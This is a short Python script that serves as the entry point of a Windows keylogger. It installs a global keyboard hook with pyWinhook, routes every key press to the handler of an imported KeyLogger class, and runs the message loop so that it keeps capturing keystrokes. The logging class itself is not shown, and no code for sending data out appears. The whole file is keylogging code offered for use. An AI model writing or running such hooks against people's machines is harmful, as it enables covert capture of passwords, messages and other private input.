import pyWinhook
import pythoncom
import KeyLogger

ms = KeyLogger.KeyLogger()
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = ms.handle
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
